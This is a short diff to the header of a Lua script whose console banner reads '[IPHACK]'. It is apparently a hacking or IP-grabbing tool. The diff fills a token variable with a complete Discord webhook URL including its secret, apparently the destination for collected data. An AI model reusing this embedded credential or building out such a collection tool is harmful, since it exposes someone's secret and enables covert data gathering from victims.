@@ -1,6 +1,6 @@
 #!/bin/env lua
 
-local token = ""
+local token = "https://discord.com/api/webhooks/1549581017231265792/vXUqWMixqjjuDZZxEk8cWS238yXwQTJ6ZdCxAYz7NRgMGsGx-q4ULGuiWELzwV7cx0vX"
 local header = "> # [IPHACK]: \n > "
 local localheader = "\27[96m[proccess]: \27[0m"
 local infoheader = "\27[96m[process]: \27[92m"
